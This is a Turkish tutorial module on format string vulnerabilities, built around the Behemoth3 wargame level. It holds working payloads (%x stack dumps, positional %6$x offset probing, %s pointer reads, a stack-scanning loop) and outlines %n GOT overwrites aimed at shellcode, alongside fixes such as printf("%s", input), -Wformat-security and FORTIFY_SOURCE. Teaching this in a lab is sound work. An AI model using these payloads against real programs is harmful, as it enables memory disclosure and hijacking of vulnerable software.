# Modül 5 — Format String Zafiyeti

> **İlgili Seviye:** Behemoth3  
> **Anahtar Kavramlar:** Format specifier, stack okuma, arbitrary read/write  
> **Kazanım:** `printf(input)` anti-pattern'inin neden arbitray memory read/write'a yol açtığını anlamak

---

## 🧠 1. Büyük Resim (Konsept Nedir?)

Bir çalışanın iş başvuru formunu hayal et. Formda "Adınız:" yazan kutuya isim yerine şunu yazıyor: "Tüm dosyaları sil ve yetkili kullan." Eğer form sistemi bu girdiyi doğrudan bir komut olarak işlerse, büyük sorun çıkar.

Format string zafiyeti tam olarak budur. `printf` gibi fonksiyonlar, ilk argümanı bir **şablon** (format string) olarak işler. Bu şablondaki `%x`, `%s`, `%n` gibi özel karakterler printf'e "stack'ten değer al" der. Kullanıcı girdisi bu şablona doğrudan geçirilirse, kullanıcı kendi format karakterlerini yazarak stack'i okuyabilir — hatta belleğe yazabilir.

```c
// Güvenli — kullanıcı girdi ne olursa olsun sadece string çıktısı
printf("%s", kullanici_girdisi);

// Tehlikeli — kullanıcı girdi FORMAT olarak işleniyor
printf(kullanici_girdisi);
```

---

## 🔍 2. Zafiyetin Anatomisi (Neden Kaynaklanıyor?)

### `printf` nasıl çalışır?

`printf` çağrıldığında argümanları stack'ten sırayla okur:

```
printf("Merhaba %s, skorum: %d\n", isim, skor);
```

Stack düzeni (basitleştirilmiş):

```
Yüksek adres
────────────────────
│  skor (int)      │  ← 3. argüman
│  isim (char*)    │  ← 2. argüman
│  format string*  │  ← 1. argüman (şablon)
────────────────────
```

`printf` format string'i soldan sağa okur:
- `%s` görünce: stack'ten bir sonraki argümanı pointer olarak al, o adresten string oku
- `%d` görünce: stack'ten bir sonraki argümanı integer olarak al
- `%x` görünce: stack'ten bir sonraki argümanı hex integer olarak al

### Fazla `%x` ne olur?

Eğer format string'de `%x` sayısı argüman sayısından fazlaysa, printf stack'teki **diğer verileri** okumaya devam eder:

```c
printf("%x %x %x %x %x %x");
// Argüman yok, ama printf stack'ten 6 değer okur
// Stack'te ne varsa — dönüş adresleri, yerel değişkenler, her şey — çıkar
```

```
Stack:
────────────────────
│  0xffffd5c0      │ ← format string pointer (printf'in 1. argümanı)
│  0x0804a020      │ ← stack'teki rastgele veri — %x ile okunur
│  0xf7e2a289      │ ← %x ile okunur
│  0x00000000      │ ← %x ile okunur
│  0x41414141      │ ← bizim girdiğimiz "AAAA" buraya düşmüş olabilir
────────────────────
```

### Behemoth3'te ne oluyor?

```c
// Binary'nin yaptığı (yaklaşık):
char input[512];
printf("Identify yourself: ");
fgets(input, sizeof(input), stdin);
printf("Welcome, ");
printf(input);    // ← ZAFİYET: input doğrudan format olarak geçiyor
```

Test:

```bash
behemoth3@behemoth:~$ echo "%x %x %x %x %x %x" | /behemoth/behemoth3
Welcome, f7e2a289 0 ffffd688 804a020 0 41414141
#                                         ↑
#                            Kendi girdi bufferimiz stack'te!
```

### Stack offset'ini bulmak

Kendi girdimizin stack'te hangi pozisyonda olduğunu bulmak:

```bash
# AAAA = 0x41414141 olarak görüneceğiz
echo "AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x" | /behemoth/behemoth3
# Welcome, AAAA.f7e2a289.0.ffffd688.804a020.0.41414141 ...
#                                                ↑
#                           6. pozisyonda kendi girdiğimizi görüyoruz
```

Doğrudan offset belirterek:

```bash
echo "AAAA.%6\$x" | /behemoth/behemoth3
# Welcome, AAAA.41414141   ← 6. offset'te kendi girdi var
```

Bu kritik: girdimizin buffer'da hangi stack pozisyonuna denk geldiğini biliyoruz.

### `%s` ile pointer okuma

`%x` ham hex değer okur. `%s` ise o değeri **pointer olarak** kullanır ve işaret ettiği adresten string okur:

```bash
# Stack'teki 3. değeri pointer olarak al, o adresten string oku
echo "%3\$s" | /behemoth/behemoth3
# Stack'te pointer olan her değer string olarak okunur
```

Eğer stack'te `/etc/behemoth_pass/behemoth4` dosyasının içeriğine işaret eden bir pointer varsa, `%s` onu okur.

### `%n` ile belleğe yazma (ileri seviye)

`%n` format specifier'ı, o ana kadar yazdırılan karakter sayısını belirtilen adrese **yazar**. Bu arbitrary write'ın temelidir:

```c
int val;
printf("AAAA%n", &val);
// val artık 4 (dört karakter yazdırıldı)
```

Saldırgan bunu şu şekilde kullanır:
1. Buffer'a hedef adresi yaz (örneğin `exit()` GOT girdisi)
2. `%n` ile o adrese istediğin değeri yaz (shellcode adresi)
3. Program `exit()` çağrıldığında shellcode çalışır

Behemoth3 seviyesi için `%s` ile okuma genellikle yeterlidir.

---

## 🛠️ 3. Defansif Bakış Açısı (Nasıl Düzeltilir?)

### Sorunlu kod

```c
// YANLIŞ — kullanıcı girdi format olarak işleniyor
printf(input);
fprintf(log_file, input);
syslog(LOG_INFO, input);
sprintf(output, input);
```

### Doğru kod

```c
// DOĞRU — kullanıcı girdi her zaman argüman, format string sabittir
printf("%s", input);
fprintf(log_file, "%s", input);
syslog(LOG_INFO, "%s", input);
snprintf(output, sizeof(output), "%s", input);
```

Kural basit: **format string her zaman string literal (sabit metin) olmalı, kullanıcı girdisi hiçbir zaman format string pozisyonuna gelmemeli.**

### Derleyici uyarısı

Modern GCC bu hatayı yakalar:

```bash
$ gcc -Wall -Wformat-security vuln.c
warning: format not a string literal and no format arguments [-Wformat-security]
    printf(input);
```

`-Wformat-security` flag'i her production build'de aktif olmalı.

### Glibc korumaları

Modern sistemlerde glibc, `%n` kullanımını kısıtlar:

```bash
# FORTIFY_SOURCE ile derleme
gcc -D_FORTIFY_SOURCE=2 -O2 vuln.c

# Runtime'da format string'de %n varsa ve format sabit değilse:
# *** %n in writable segment detected ***
# Aborted (core dumped)
```

---

## 🚨 4. Yeni Başlayanların Düştüğü Tuzaklar

**`%x` ile `%s` farkını karıştırmak.**  
`%x` stack'teki değeri ham hex olarak basar.  
`%s` stack'teki değeri adres olarak alır ve o adresten okur.  
Geçersiz bir adres `%s`'e verilirse program segfault verir:

```bash
# Tehlikeli — rastgele adres pointer olarak kullanılırsa crash
echo "%s%s%s%s%s%s%s%s" | /behemoth/behemoth3
# Segmentation fault (geçersiz adres okundu)

# Güvenli başlangıç — önce %x ile stack'i anla
echo "%x.%x.%x.%x.%x.%x.%x.%x" | /behemoth/behemoth3
```

**Format string'de `$` kullanırken shell escape.**  
`%6$x` bash'te değişken genişletmesi yapabilir. Tırnak kullanımına dikkat:

```bash
# YANLIŞ — bash $x'i genişletmeye çalışır
echo "%6$x" | /behemoth/behemoth3

# DOĞRU — tek tırnak veya escape
echo '%6$x' | /behemoth/behemoth3
# veya
echo "%6\$x" | /behemoth/behemoth3
```

**`fgets` null byte davranışı.**  
`fgets` ile okunan input'ta newline `\n` de gelir. Format string testinde bu bazen offset hesabını bozabilir. Test ederken `printf` ile newline vermeden dene:

```bash
printf '%x.%x.%x.%x' | /behemoth/behemoth3
# vs
echo '%x.%x.%x.%x' | /behemoth/behemoth3   # sonunda \n var
```

**Offset'i sabit sanmak.**  
Stack offset'i binary'nin nasıl derlendiğine, ortam değişkenlerine ve çalışma koşullarına göre değişebilir. Her oturumda tekrar doğrula.

```bash
# Her oturumun başında offset'i teyit et
echo "AAAA.%1\$x.%2\$x.%3\$x.%4\$x.%5\$x.%6\$x.%7\$x" | /behemoth/behemoth3
# 41414141 görülen pozisyon = doğru offset
```

---

## Özet

```
Format String Zafiyeti
         │
         ▼
printf(kullanici_girdisi)
         │
    Kullanıcı "%x %x %x %x" girer
         │
         ▼
printf stack'ten 4 değer okur
(argüman olmasa bile)
         │
    Stack içeriği sızdı (memory leak)
         │
    %s ile pointer deref → arbitrary read
    %n ile adrese yaz   → arbitrary write
         │
         ▼
Savunma:
  printf("%s", input)  ← format sabit, input argüman
  -Wformat-security    ← derleme zamanı uyarı
  FORTIFY_SOURCE=2     ← runtime %n koruması
```

---

## Pratik Komut Seti

```bash
# 1. Zafiyet var mı?
echo "%x %x %x" | /behemoth/binary
# Stack değerleri görünüyorsa → format string zafiyeti var

# 2. Kendi buffer'ımız kaçıncı offset'te?
echo "AAAA.%1\$x.%2\$x...%10\$x" | /behemoth/binary
# 41414141 görülen pozisyon = offset

# 3. O offset'teki pointer'ı string olarak oku
printf "AAAA.%%<OFFSET>\$s" | /behemoth/binary

# 4. Stack'i geniş tara
for i in $(seq 1 30); do
    echo -n "[$i]: "
    printf "%%${i}\$x\n" | /behemoth/binary 2>/dev/null
done
```

---

## Kaynaklar

- [Exploit Education — Format Strings](https://exploit.education/protostar/format-zero/)
- [OWASP — Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)
- [CWE-134: Use of Externally-Controlled Format String](https://cwe.mitre.org/data/definitions/134.html)
- [GCC -Wformat-security](https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html)
- [printf(3) man page](https://man7.org/linux/man-pages/man3/printf.3.html) — format specifier listesi
